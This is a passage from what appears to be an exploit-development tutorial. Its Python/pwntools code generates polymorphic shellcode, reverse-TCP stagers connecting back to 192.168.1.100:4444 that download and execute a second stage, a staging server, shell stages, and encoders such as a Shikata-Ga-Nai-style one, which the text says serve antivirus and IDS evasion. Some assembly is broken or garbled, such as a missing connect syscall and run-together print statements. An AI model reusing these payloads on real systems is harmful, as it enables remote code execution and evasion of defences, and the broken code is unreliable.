        return encoded, key, method
    
    def generate_variant(self):
        """Generate a complete polymorphic variant"""
        # Convert to assembly
        asm_code = disasm(self.original)
        
        # Apply mutations
        asm_code = self.insert_garbage(asm_code)
        asm_code = self.mutate_registers(asm_code)
        
        # Reassemble
        mutated = asm(asm_code)
        
        # Apply encoding
        encoded, key, method = self.apply_encoding(mutated)
        
        # Generate decoder
        decoder = self._generate_decoder(key, len(encoded), method)
        
        return decoder + encoded
    
    def _generate_decoder(self, key, length, method):
        """Generate decoder stub"""
        if method == 'xor':
            op = 'xor'
        elif method == 'add':
            op = 'sub'
        elif method == 'sub':
            op = 'add'
        else:
            op = 'xor'
        
        decoder = f"""
        jmp short call_decoder
        decoder:
            pop esi
            xor ecx, ecx
            mov cl, {length}
        loop_start:
            {op} byte ptr [esi], {key}
            inc esi
            loop loop_start
            ret
        call_decoder:
            call decoder
        """
        return asm(decoder)
    
    def generate_multiple(self, count=5):
        """Generate multiple unique variants"""
        variants = []
        for i in range(count):
            variant = self.generate_variant()
            variants.append(variant)
            log.info(f"Variant {i+1}: {len(variant)} bytes")
        
        return variants

# Usage
original_shellcode = asm(shellcraft.i386.linux.sh())

generator = AdvancedPolymorphicGenerator(original_shellcode)
variants = generator.generate_multiple(count=5)

print(f"\nGenerated {len(variants)} unique polymorphic variants")
for i, variant in enumerate(variants):
    print(f"\nVariant {i+1}:")
    print(f"Size: {len(variant)} bytes")
    print(f"MD5: {hashlib.md5(variant).hexdigest()}")
    
    # Test for null bytes
    if b'\x00' in variant:
        print("Contains null bytes")
    else:
        print("No null bytes")
```

## Staged Payloads

### Concept and Architecture

**Definition:** Multi-stage exploitation where initial small payload (stage 0) downloads and executes larger payload (stage 1+).

**Why Staged:**

- Bypass length restrictions
- Evade detection (small initial footprint)
- Flexibility (download different stage 1 based on target)
- Reliability (stage 0 establishes stable connection)

**Architecture:**

```
┌─────────────────┐
│   Stage 0       │  Small payload (50-200 bytes)
│  (Stager)       │  - Establish connection
│                 │  - Receive stage 1
│                 │  - Execute stage 1
└────────┬────────┘
         │
         │ Download over network
         ▼
┌─────────────────┐
│   Stage 1       │  Full-featured payload
│  (Stage)        │  - Meterpreter
│                 │  - Shell
│                 │  - Custom payload
└─────────────────┘
```

### Stage 0 - Stager Shellcode

#### TCP Reverse Connection Stager (Linux x86)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.os = 'linux'

def generate_reverse_tcp_stager(lhost, lport):
    """
    Generate minimal reverse TCP stager
    Connects back, receives stage 1, executes it
    """
    # Convert IP to hex
    ip_parts = lhost.split('.')
    ip_hex = struct.pack('!BBBB', *map(int, ip_parts))
    ip_dword = u32(ip_hex)
    
    # Port in network byte order
    port_word = struct.pack('!H', lport)
    port_hex = u16(port_word)
    
    stager = f"""
    start:
        ; socket(AF_INET, SOCK_STREAM, 0)
        xor eax, eax
        xor ebx, ebx
        xor edx, edx
        push edx            ; protocol = 0
        push 1              ; SOCK_STREAM
        push 2              ; AF_INET
        mov al, 102         ; sys_socketcall
        mov bl, 1           ; SYS_SOCKET
        mov ecx, esp
        int 0x80
        mov esi, eax        ; Save socket fd in ESI
        
        ; connect(sockfd, &addr, 16)
        push {hex(ip_dword)}    ; sin_addr (IP)
        push word {hex(port_hex)} ; sin_port
        push word 2         ; sin_family = AF_INET
        mov ecx, esp        ; ECX = &sockaddr
        
        push byte 16        ; addrlen
        push ecx            ; &sockaddr
        push esi            ; sockfd
        mov ecx, esp        ; ECX = args array
        
        xor eax, eax
        mov al, 102         ; sys_socketcall
        mov bl, 3           ; SYS_CONNECT
        int 0x80
        
        ; read(sockfd, buf, 4096)
        ; Read stage 1 size first (4 bytes)
        sub esp, 4
        mov ecx, esp        ; Buffer for size
        
        xor eax, eax
        mov al, 3           ; sys_read
        mov ebx, esi        ; sockfd
        xor edx, edx
        mov dl, 4           ; Read 4 bytes
        int 0x80
        
        pop edx             ; EDX = stage1 size
        
        ; Allocate memory for stage 1
        ; mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0)
        xor eax, eax
        push eax            ; offset = 0
        push 0xffffffff     ; fd = -1
        push 0x22           ; MAP_ANONYMOUS | MAP_PRIVATE
        push 7              ; PROT_READ | PROT_WRITE | PROT_EXEC
        push edx            ; size
        push 0              ; addr = NULL
        mov al, 90          ; sys_mmap
        mov ebx, esp
        int 0x80
        mov edi, eax        ; EDI = allocated buffer
        
        ; read(sockfd, buffer, size)
        xor eax, eax
        mov al, 3           ; sys_read
        mov ebx, esi        ; sockfd
        mov ecx, edi        ; buffer
        ; edx already contains size
        int 0x80
        
        ; jmp to stage 1
        jmp edi
    """
    
    return asm(stager)

# Generate stager
lhost = "192.168.1.100"
lport = 4444

stager = generate_reverse_tcp_stager(lhost, lport)

print("Reverse TCP Stager:")
print(f"Size: {len(stager)} bytes")
print(f"Connects to: {lhost}:{lport}")
print(f"\nHex:\n{stager.hex()}")
print(f"\nDisassembly:\n{disasm(stager)}")

# Test for bad characters
bad_chars = b'\x00\x0a\x0d'
has_bad = any(c in stager for c in bad_chars)
print(f"\nBad characters: {'FOUND' if has_bad else 'None'}")
```

#### Optimized Minimal Stager (x86)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def minimal_stager(ip, port):
    """
    Ultra-minimal stager (~60 bytes)
    Uses socket reuse and minimal error checking
    """
    ip_hex = u32(socket.inet_aton(ip))
    port_hex = u16(struct.pack('!H', port))
    
    stager = f"""
        ; socket + connect (combined)
        push 0x{ip_hex:08x}
        push word 0x{port_hex:04x}
        push word 2
        mov ecx, esp
        push 66
        pop eax
        cdq
        push edx
        push 1
        push 2
        mov ebx, esp
        push byte 1
        pop ebx
        int 0x80
        xchg eax, edi
        
        ; connect
        xchg ebx, ecx
        push byte 16
        push ecx
        push edi
        mov ecx, esp
        mov al, 66
        mov bl, 3
        int 0x80
        
        ; read stage
        mov dh, 0x10
        mov al, 3
        int 0x80
        
        ; execute
        jmp ecx
    """
    return asm(stager)

# Ultra-compact version
stager = minimal_stager("192.168.1.100", 4444)
print(f"Minimal stager: {len(stager)} bytes")
```

#### Stage 0 for x64 Linux

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

def x64_reverse_tcp_stager(lhost, lport):
    """64-bit reverse TCP stager"""
    ip_hex = u32(socket.inet_aton(lhost))
    port_hex = u16(struct.pack('!H', lport))
    
    stager = f"""
        ; socket(AF_INET, SOCK_STREAM, 0)
        push 41
        pop rax             ; sys_socket
        push 2
        pop rdi             ; AF_INET
        push 1
        pop rsi             ; SOCK_STREAM
        cdq                 ; RDX = 0
        syscall
        mov rdi, rax        ; Save socket fd
        
        ; connect(sockfd, &addr, 16)
        xchg rax, rdi
        movabs rcx, 0x{ip_hex:08x}00020002
        push rcx
        mov rsi, rsp
        push 16
        pop rdx
        push 42
        pop rax   ; sys_connect syscall

	    ; Read stage1 size (4 bytes)
	    xor eax, eax        ; sys_read
	    mov rsi, rsp
	    push 4
	    pop rdx
	    syscall
	    
	    ; Get size from stack
	    pop rdx             ; RDX = stage1 size
	    
	    ; mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0)
	    push 9
	    pop rax             ; sys_mmap
	    xor edi, edi        ; addr = NULL
	    mov rsi, rdx        ; size
	    push 7
	    pop rdx             ; prot = RWX
	    push 0x22
	    pop r10             ; flags = MAP_ANONYMOUS | MAP_PRIVATE
	    or r8, -1           ; fd = -1
	    xor r9, r9          ; offset = 0
	    syscall
	    mov r9, rax         ; Save buffer address
	    
	    ; read(sockfd, buffer, size)
	    xor eax, eax        ; sys_read
	    ; rdi already contains sockfd
	    mov rsi, r9         ; buffer
	    mov rdx, rsi        ; Use buffer address as size placeholder
	    syscall
	    
	    ; Execute stage1
	    jmp r9
	"""

	return asm(stager)

# Generate x64 stager
stager_64 = x64_reverse_tcp_stager("192.168.1.100", 4444)

print("x64 Reverse TCP Stager:") print(f"Size: {len(stager_64)} bytes") print(f"\nDisassembly:\n{disasm(stager_64)}")
````

### Stage 1 - Full Payloads

#### Simple Shell Stage

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def generate_shell_stage():
    """
    Stage 1: Full interactive shell
    Assumes socket fd is in a known register (EDI from stager)
    """
    shell_stage = """
        ; dup2(sockfd, 0)  - stdin
        xor eax, eax
        mov al, 63          ; sys_dup2
        xor ebx, ebx
        mov bl, edi         ; sockfd from stager
        xor ecx, ecx        ; 0 = stdin
        int 0x80
        
        ; dup2(sockfd, 1)  - stdout
        mov al, 63
        inc ecx             ; 1 = stdout
        int 0x80
        
        ; dup2(sockfd, 2)  - stderr
        mov al, 63
        inc ecx             ; 2 = stderr
        int 0x80
        
        ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp        ; EBX = "/bin//sh"
        
        push eax
        push ebx
        mov ecx, esp        ; ECX = ["/bin/sh", NULL]
        
        mov edx, eax        ; EDX = NULL (envp)
        
        mov al, 11          ; sys_execve
        int 0x80
    """
    
    return asm(shell_stage)

# Generate and display
stage1 = generate_shell_stage()
print(f"Shell stage: {len(stage1)} bytes")
print(disasm(stage1))
````

#### Advanced Stage with Features

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def generate_advanced_stage():
    """
    Advanced stage 1 with error handling and features
    """
    advanced = """
        ; Save socket descriptor
        mov esi, edi        ; ESI = sockfd
        
        ; Fork to background
        xor eax, eax
        mov al, 2           ; sys_fork
        int 0x80
        test eax, eax
        jnz parent_exit     ; Parent exits
        
        ; Child continues
        ; Redirect file descriptors
        xor ecx, ecx
    dup_loop:
        mov al, 63          ; sys_dup2
        mov ebx, esi        ; sockfd
        int 0x80
        inc ecx
        cmp cl, 3
        jl dup_loop
        
        ; Change directory to /
        xor eax, eax
        push eax
        push 0x2f           ; "/"
        mov ebx, esp
        mov al, 12          ; sys_chdir
        int 0x80
        
        ; Set session ID
        mov al, 66          ; sys_setsid
        int 0x80
        
        ; Execute shell
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        push ebx
        mov ecx, esp
        cdq
        mov al, 11
        int 0x80
        
    parent_exit:
        ; Parent exits cleanly
        xor eax, eax
        mov al, 1           ; sys_exit
        xor ebx, ebx
        int 0x80
    """
    
    return asm(advanced)

stage1_advanced = generate_advanced_stage()
print(f"Advanced stage: {len(stage1_advanced)} bytes")
```

### Staging Protocol

#### Simple Length-Prefixed Protocol

```python
#!/usr/bin/env python3
from pwn import *
import socket
import threading

def staging_server(lhost, lport, stage1_payload):
    """
    Simple staging server
    Protocol: Send 4-byte length, then payload
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((lhost, lport))
    server.listen(1)
    
    log.info(f"Staging server listening on {lhost}:{lport}")
    log.info(f"Stage1 size: {len(stage1_payload)} bytes")
    
    try:
        while True:
            conn, addr = server.accept()
            log.success(f"Connection from {addr[0]}:{addr[1]}")
            
            # Send stage1 size
            size = struct.pack('<I', len(stage1_payload))
            conn.send(size)
            log.info(f"Sent size: {len(stage1_payload)}")
            
            # Send stage1 payload
            conn.send(stage1_payload)
            log.success("Sent stage1 payload")
            
            # Keep connection alive for shell interaction
            while True:
                try:
                    data = conn.recv(1024)
                    if not data:
                        break
                    print(data.decode(), end='')
                except:
                    break
            
            conn.close()
            log.info("Connection closed")
    except KeyboardInterrupt:
        log.info("Server stopped")
    finally:
        server.close()

# Usage example
if __name__ == "__main__":
    # Generate stage1 (shell)
    context.arch = 'i386'
    stage1 = asm(shellcraft.i386.linux.dupsh(0))  # Assume fd 0 is socket
    
    # Start server
    staging_server('0.0.0.0', 4444, stage1)
```

#### Encrypted Staging Protocol

```python
#!/usr/bin/env python3
from pwn import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib

def encrypt_stage(payload, key):
    """Encrypt stage1 with AES"""
    # Pad payload to AES block size
    block_size = 16
    padding = block_size - (len(payload) % block_size)
    padded = payload + bytes([padding] * padding)
    
    # Generate IV
    iv = get_random_bytes(16)
    
    # Encrypt
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(padded)
    
    return iv + encrypted

def generate_decryption_stager(key, ip, port):
    """
    Generate stager that receives and decrypts stage1
    Key is embedded in stager
    """
    context.arch = 'i386'
    
    # This is simplified - real implementation would need:
    # 1. Proper AES implementation in assembly (complex)
    # 2. Or use simple XOR for demonstration
    
    # Simple XOR version for demonstration
    key_byte = key[0]  # Use first byte as XOR key
    
    stager = f"""
        ; Connect to server (omitted for brevity - use previous connect code)
        ; ...
        
        ; Read encrypted stage
        ; Assume socket in EDI, buffer in ESI
        
        ; Decrypt loop
        mov ecx, eax        ; Length received
        mov edi, esi        ; Buffer
    decrypt_loop:
        xor byte ptr [edi], {key_byte}
        inc edi
        loop decrypt_loop
        
        ; Execute decrypted stage
        jmp esi
    """
    
    return asm(stager)

# Example
key = b"mysecretkey12345"  # 16 bytes for AES
stage1 = asm(shellcraft.i386.linux.sh())
encrypted = encrypt_stage(stage1, key)

print(f"Original stage: {len(stage1)} bytes")
print(f"Encrypted stage: {len(encrypted)} bytes")
```

### Multi-Stage Architecture

```python
#!/usr/bin/env python3
from pwn import *

class MultiStagePayload:
    """
    Multi-stage payload system
    Stage 0: Minimal connector
    Stage 1: Reflective loader
    Stage 2: Full-featured payload
    """
    
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.stages = []
    
    def generate_stage0(self):
        """Minimal connector (50-100 bytes)"""
        context.arch = 'i386'
        
        stage0 = f"""
            ; Minimal connect and receive
            ; Implementation omitted for brevity
        """
        
        return asm(stage0)
    
    def generate_stage1(self):
        """Reflective loader (200-500 bytes)"""
        context.arch = 'i386'
        
        stage1 = """
            ; Receive stage2 size
            ; Allocate memory with mmap
            ; Receive stage2
            ; Parse and load (if ELF/PE)
            ; Jump to entry point
        """
        
        return asm(stage1)
    
    def generate_stage2(self):
        """Full payload (unlimited size)"""
        # Can be complex shellcode, or even compiled binary
        
        stage2 = """
            ; Full-featured shell
            ; Or Meterpreter-like functionality
            ; Or custom payload
        """
        
        return asm(stage2)
    
    def serve(self):
        """Serve all stages"""
        server = socket.socket()
        server.bind((self.lhost, self.lport))
        server.listen(1)
        
        log.info(f"Multi-stage server on {self.lhost}:{self.lport}")
        
        conn, addr = server.accept()
        log.success(f"Connection from {addr}")
        
        # Send stage 1
        stage1 = self.generate_stage1()
        conn.send(struct.pack('<I', len(stage1)))
        conn.send(stage1)
        log.info("Sent stage 1")
        
        # Wait for request, send stage 2
        req = conn.recv(4)
        if req:
            stage2 = self.generate_stage2()
            conn.send(struct.pack('<I', len(stage2)))
            conn.send(stage2)
            log.success("Sent stage 2")
        
        # Interactive session
        t = tube()
        t.interactive()
```

### Metasploit-Style Staging

```python
#!/usr/bin/env python3
from pwn import *

def generate_msf_style_stager(arch='x86'):
    """
    Generate Metasploit-style stager
    Uses recv-exec pattern
    """
    if arch == 'x86':
        context.arch = 'i386'
        
        stager = """
            ; socket() - omitted
            ; connect() - omitted
            
            ; recv() in loop until complete
            xor ebx, ebx
            mul ebx
            mov edi, esp
            
        recv_loop:
            push ebx
            push edi
            push esi                ; sockfd
            push eax
            mov al, 0x66            ; socketcall
            mov bl, 0x0a            ; recv
            mov ecx, esp
            int 0x80
            test eax, eax
            js failed
            add edi, eax
            sub [esp+8], eax
            jnz recv_loop
            
            pop eax
            pop ebx
            pop ecx
            pop edx
            jmp ecx
            
        failed:
            mov eax, 1
            mov ebx, 1
            int 0x80
        """
        
        return asm(stager)
    
    elif arch == 'x64':
        context.arch = 'amd64'
        
        stager = """
            ; Similar pattern for x64
            ; Using sys_read in loop
        """
        
        return asm(stager)

# Generate
msf_stager = generate_msf_style_stager('x86')
print(f"MSF-style stager: {len(msf_stager)} bytes")
```

## Shellcode Encoders

### Purpose and Types

**Why Encode:**

1. **Bad Character Avoidance:** Remove null bytes, newlines, etc.
2. **IDS/AV Evasion:** Change signature
3. **Size Optimization:** Compress large payloads
4. **Obfuscation:** Hide malicious intent

**Encoding Types:**

- **XOR Encoding:** Simple, effective
- **ADD/SUB Encoding:** Alternative to XOR
- **Alpha-numeric Encoding:** Only use alphanumeric characters
- **Unicode Encoding:** Bypass Unicode filters
- **Compression:** Reduce size

### XOR Encoder (Advanced)

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

class XOREncoder:
    """Advanced XOR encoder with multiple features"""
    
    def __init__(self, bad_chars=None):
        self.bad_chars = bad_chars or [0x00, 0x0a, 0x0d]
    
    def find_good_key(self, shellcode):
        """Find XOR key that doesn't produce bad characters"""
        for key in range(1, 256):
            encoded = bytes([b ^ key for b in shellcode])
            
            # Check if key itself is bad
            if key in self.bad_chars:
                continue
            
            # Check if encoding produces bad chars
            if any(b in self.bad_chars for b in encoded):
                continue
            
            return key
        
        raise ValueError("No suitable XOR key found")
    
    def encode(self, shellcode):
        """Encode shellcode with XOR"""
        key = self.find_good_key(shellcode)
        encoded = bytes([b ^ key for b in shellcode])
        
        return encoded, key
    
    def generate_decoder(self, key, encoded_len):
        """Generate decoder stub"""
        decoder = f"""
        decoder_start:
            jmp short get_shellcode_addr
        
        decoder:
            pop esi                     ; ESI = encoded shellcode address
            xor ecx, ecx
            mov cl, {encoded_len}       ; Counter
        
        decode_loop:
            xor byte ptr [esi], {key}   ; Decode byte
            inc esi
            loop decode_loop
            
            sub esi, {encoded_len}      ; Reset ESI to start
            jmp esi                     ; Execute decoded shellcode
        
        get_shellcode_addr:
            call decoder
        """
        
        return asm(decoder)
    
    def create_payload(self, shellcode):
        """Create complete encoded payload"""
        encoded, key = self.encode(shellcode)
        decoder = self.generate_decoder(key, len(encoded))
        
        payload = decoder + encoded
        
        # Verify no bad chars in final payload
        if any(b in self.bad_chars for b in payload):
            raise ValueError("Bad characters in final payload!")
        
        return payload, key

# Usage
encoder = XOREncoder(bad_chars=[0x00, 0x0a, 0x0d, 0x20])

original = asm(shellcraft.i386.linux.sh())
print(f"Original shellcode: {len(original)} bytes")

encoded_payload, key = encoder.create_payload(original)
print(f"Encoded payload: {len(encoded_payload)} bytes")
print(f"Key: {hex(key)}")

# Check for bad chars
bad_found = [hex(b) for b in encoded_payload if b in encoder.bad_chars]
print(f"Bad chars: {bad_found if bad_found else 'None'}")

print(f"\nPayload hex:\n{encoded_payload.hex()}")
```

### Multi-Byte XOR Encoder

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

def multibyte_xor_encode(shellcode, key_length=4):
    """
    Encode with multi-byte XOR key
    More resistant to cryptanalysis
    """
    # Generate random key
    key = bytes([random.randint(1, 255) for _ in range(key_length)])
    
    # Encode
    encoded = b""
    for i, byte in enumerate(shellcode):
        key_byte = key[i % key_length]
        encoded += bytes([byte ^ key_byte])
    
    return encoded, key

def generate_multibyte_decoder(key, encoded_len):
    """Generate decoder for multi-byte XOR"""
    key_setup = ""
    for i, k in enumerate(key):
        key_setup += f"    mov byte ptr [ebp-{i+1}], {k}\n"
    
    decoder = f"""
    decoder_start:
        call get_eip
    get_eip:
        pop ebp
        
        ; Setup key on stack
{key_setup}
        
        ; Get shellcode address
        lea esi, [ebp + shellcode - get_eip]
        
        xor ecx, ecx
        mov cx, {encoded_len}
        xor edi, edi            ; Key index
        
    decode_loop:
        mov al, byte ptr [ebp-1]  ; Load key byte
        lea ebx, [ebp - {len(key)}]
        mov al, byte ptr [ebx + edi]
        
        xor byte ptr [esi], al
        inc esi
        inc edi
        cmp edi, {len(key)}
        jl no_reset
        xor edi, edi
    no_reset:
        loop decode_loop
        
        lea eax, [ebp + shellcode - get_eip]
        jmp eax
        
    shellcode:
    """
    
    return asm(decoder)

# Example
original = asm(shellcraft.i386.linux.sh())
encoded, key = multibyte_xor_encode(original, key_length=4)

print(f"Multi-byte XOR encoding:")
print(f"Key: {key.hex()}")
print(f"Encoded size: {len(encoded)} bytes")
```

### ADD/SUB Encoder

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

class ADDEncoder:
    """ADD-based encoder (alternative to XOR)"""
    
    def __init__(self, bad_chars=None):
        self.bad_chars = bad_chars or [0x00]
    
    def encode(self, shellcode):
        """Encode using ADD operation"""
        # Find key that avoids bad chars
        for key in range(1, 256):
            encoded = bytes([(b + key) & 0xFF for b in shellcode])
            
            if key in self.bad_chars:
                continue
            
            if any(b in self.bad_chars for b in encoded):
                continue
            
            return encoded, key
        
        raise ValueError("No suitable key found")
    
    def generate_decoder(self, key, encoded_len):
        """Generate SUB decoder (inverse of ADD)"""
        decoder = f"""
        jmp short call_decoder
        
        decoder:
            pop esi
            xor ecx, ecx
            mov cl, {encoded_len}
        
        decode_loop:
            sub byte ptr [esi], {key}
            inc esi
            loop decode_loop
            
            sub esi, {encoded_len}
            jmp esi
        
        call_decoder:
            call decoder
        """
        
        return asm(decoder)

# Usage
add_encoder = ADDEncoder()
original = asm(shellcraft.i386.linux.sh())

encoded, key = add_encoder.encode(original)
decoder = add_encoder.generate_decoder(key, len(encoded))

final = decoder + encoded

print(f"ADD-encoded payload: {len(final)} bytes")
print(f"Key: {hex(key)}")
```

### Alpha-Numeric Encoder

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

class AlphanumericEncoder:
    """
    Encode shellcode using only alphanumeric characters (0-9, A-Z, a-z)
    Significantly increases size but bypasses certain filters
    """
    
    def __init__(self):
        self.alphanumeric = set()
        self.alphanumeric.update(range(ord('0'), ord('9') + 1))
        self.alphanumeric.update(range(ord('A'), ord('Z') + 1))
        self.alphanumeric.update(range(ord('a'), ord('z') + 1))
    
    def is_alphanum(self, byte):
        """Check if byte is alphanumeric"""
        return byte in self.alphanumeric
    
    def encode_byte(self, byte):
        """
        Encode single byte using alphanumeric instructions
        Example: To get 0x90, use: push 0x39; pop eax; xor al, 0x39
        """
        # This is complex - simplified version
        # Real implementation would use genetic algorithms or search
        
        # Find two alphanumeric bytes that XOR/ADD to target
        for b1 in self.alphanumeric:
            for b2 in self.alphanumeric:
                if (b1 ^ b2) == byte:
                    return (b1, b2, 'xor')
                if ((b1 + b2) & 0xFF) == byte:
                    return (b1, b2, 'add')
        
        return None
    
    def generate_decoder(self):
        """
        Generate alphanumeric decoder stub
        This is extremely complex in practice
        """
        # Simplified - real alphanumeric decoder is very complex
        decoder = """
            ; Alphanumeric decoder
            ; Uses only: push, pop, and, or, xor, sub, add, xchg
            ; with alphanumeric immediate values
        """
        
        return decoder

# Note: Full alphanumeric encoding is very complex
# Use tools like Metasploit's alpha_mixed encoder
print("Alphanumeric encoding requires sophisticated algorithms")
print("Typically increases payload size 5-10x")
print("Example: 100-byte shellcode → 500-1000 bytes encoded")
```

### Shikata Ga Nai Style Encoder

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

class ShikataGaNaiEncoder:
    """
    Polymorphic XOR additive feedback encoder
    Similar to Metasploit's shikata_ga_nai
    """
    
    def __init__(self):
        self.fpu_instructions = [
            asm('fnstenv [esp-12]'),
            asm('fld1'),
            asm('fldz'),
            asm('fldpi'),
            asm('fld1\nfld1\nfaddp'),
        ]
    
    def encode(self, shellcode):
        """
        Encode with polymorphic XOR additive feedback
        Each iteration changes the key
        """
        key = random.randint(0x1000000, 0xFFFFFFFF)
        encoded = b""
        
        for i in range(0, len(shellcode), 4):
            chunk = shellcode[i:i+4].ljust(4, b'\x90')
            dword = u32(chunk)
            
            # XOR with key
            encoded_dword = dword ^ key
            encoded += p32(encoded_dword)
            
            # Update key (additive feedback)
            key = (key + encoded_dword) & 0xFFFFFFFF
        
        return encoded, key
    
    def generate_decoder(self, initial_key, encoded_len):
        """Generate polymorphic decoder"""
        # Random FPU instruction for polymorphism
        fpu_instr = random.choice(self.fpu_instructions)
        
        # Random register allocation
        regs = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']
        random.shuffle(regs)
        
        ptr_reg = regs[0]
        key_reg = regs[1]
        counter_reg = regs[2]
        
        decoder = f"""
        decoder_start:
            {disasm(fpu_instr)}     ; FPU instruction for polymorphism
            pop {ptr_reg}            ; Get shellcode address
            
            mov {key_reg}, {hex(initial_key)}
            xor {counter_reg}, {counter_reg}
            mov {counter_reg.replace('e', 'c')}, {encoded_len // 4}
        
        decode_loop:
            xor dword ptr [{ptr_reg}], {key_reg}
            add {key_reg}, dword ptr [{ptr_reg}]
            add {ptr_reg}, 4
            loop decode_loop
            
            sub {ptr_reg}, {encoded_len}
            jmp {ptr_reg}
        """
        
        return asm(decoder)

# Usage
shikata = ShikataGaNaiEncoder()
original = asm(shellcraft.i386.linux.sh())

encoded, key = shikata.encode(original)
decoder = shikata.generate_decoder(key, len(encoded))

final = decoder + encoded

print("Shikata Ga Nai style encoding:")
print(f"Encoded size: {len(final)} bytes")
print(f"Initial key: {hex(key)}")
print(f"\nDecoder disassembly:\n{disasm(decoder)}")
```

### Custom Encoder Framework

```python
#!/usr/bin/env python3
from pwn import *
import random

context.arch = 'i386'

class CustomEncoderFramework:
    """
    Framework for creating custom encoders
    """
    
    def __init__(self, bad_chars=None):
        self.bad_chars = set(bad_chars or [0x00])
        self.encoders = {
            'xor': self._xor_encode,
            'add': self._add_encode,
            'sub': self._sub_encode,
            'rol': self._rol_encode,
            'ror': self._ror_encode,
        }
    
    def _xor_encode(self, data, key):
        return bytes([b ^ key for b in data])
    
    def _add_encode(self, data, key):
        return bytes([(b + key) & 0xFF for b in data])
    
    def _sub_encode(self, data, key):
        return bytes([(b - key) & 0xFF for b in data])
    
    def _rol_encode(self, data, key):
        return bytes([((b << key) | (b >> (8 - key))) & 0xFF for b in data])
    
    def _ror_encode(self, data, key):
        return bytes([((b >> key) | (b << (8 - key))) & 0xFF for b in data])
    
    def find_chain(self, shellcode, chain_length=3):
        """
        Find encoding chain that avoids bad characters
        """
        methods = list(self.encoders.keys())
        
        for _ in range(1000):  # Try 1000 random combinations
            chain = []
            current = shellcode
            
            for _ in range(chain_length):
                method = random.choice(methods)
                key = random.randint(1, 15)  # Small keys for simplicity
                
                encoded = self.encoders[method](current, key)
                
                # Check for bad chars
                if any(b in self.bad_chars for b in encoded):
                    break
                
                chain.append((method, key))
                current = encoded
            
            else:
                # Success - no bad chars
                return current, chain
        
        raise ValueError("Could not find suitable encoding chain")
    
    def generate_decoder_for_chain(self, chain, encoded_len):
        """Generate decoder for encoding chain"""
        # Decode in reverse order
        reversed_chain = list(reversed(chain))
        
        decoder_code = """
        jmp short call_decoder
        decoder:
            pop esi
            xor ecx, ecx
            mov cl, {length}
        """.format(length=encoded_len)
        
        for method, key in reversed_chain:
            if method == 'xor':
                op = f'xor byte ptr [esi], {key}'
            elif method == 'add':
                op = f'sub byte ptr [esi], {key}'
            elif method == 'sub':
                op = f'add byte ptr [esi], {key}'
            elif method == 'rol':
                op = f'ror byte ptr [esi], {key}'
            elif method == 'ror':
                op = f'rol byte ptr [esi], {key}'
            
            decoder_code += f"""
        decode_loop_{method}:
            {op}
            inc esi
            loop decode_loop_{method}
            sub esi, {encoded_len}
            mov cl, {encoded_len}
            """
        
        decoder_code += """
            jmp esi
        call_decoder:
            call decoder
        """
        
        return asm(decoder_code)

# Usage
framework = CustomEncoderFramework(bad_chars=[0x00, 0x0a, 0x0d])

original = asm(shellcraft.i386.linux.sh())
print(f"Original: {len(original)} bytes")

# Find encoding chain
encoded, chain = framework.find_chain(original, chain_length=3)
print(f"\nEncoding chain:")
for method, key in chain:
    print(f"  {method.upper()} with key {key}")

# Generate decoder
decoder = framework.generate_decoder_for_chain(chain, len(encoded))

final = decoder + encoded
print(f"\nFinal payload: {len(final)} bytes")

# Verify no bad chars
bad_found = [hex(b) for b in final if b in framework.bad_chars]
print(f"Bad chars: {bad_found if bad_found else 'None'}")
```

### Testing Encoded Shellcode

```python
#!/usr/bin/env python3
from pwn import *
import subprocess
import tempfile
import os

context.arch = 'i386'
context.os = 'linux'

class ShellcodeTester:
    """Test if encoded shellcode executes correctly"""
    
    def __init__(self):
        self.test_program_template = """
        #include <stdio.h>
        #include <string.h>
        #include <sys/mman.h>
        
        unsigned char shellcode[] = {SHELLCODE_BYTES};
        
        int main() {{
            void *exec_mem;
            
            // Allocate executable memory
            exec_mem = mmap(0, sizeof(shellcode), 
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            
            if (exec_mem == MAP_FAILED) {{
                perror("mmap");
                return 1;
            }}
            
            // Copy shellcode
            memcpy(exec_mem, shellcode, sizeof(shellcode));
            
            // Execute
            ((void(*)())exec_mem)();
            
            return 0;
        }}
        """
    
    def test_shellcode(self, shellcode, timeout=5):
        """
        Test shellcode execution
        Returns True if executes without crash
        """
        # Convert shellcode to C array format
        shellcode_str = ', '.join([f'0x{b:02x}' for b in shellcode])
        
        # Create test program
        program_code = self.test_program_template.replace(
            '{SHELLCODE_BYTES}', shellcode_str
        )
        
        # Write to temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
            f.write(program_code)
            c_file = f.name
        
        try:
            # Compile
            binary = c_file.replace('.c', '')
            compile_cmd = ['gcc', '-z', 'execstack', '-o', binary, c_file]
            
            result = subprocess.run(
                compile_cmd,
                capture_output=True,
                timeout=10
            )
            
            if result.returncode != 0:
                log.error("Compilation failed")
                return False
            
            # Execute
            try:
                result = subprocess.run(
                    [binary],
                    capture_output=True,
                    timeout=timeout
                )
                
                # Check if executed successfully
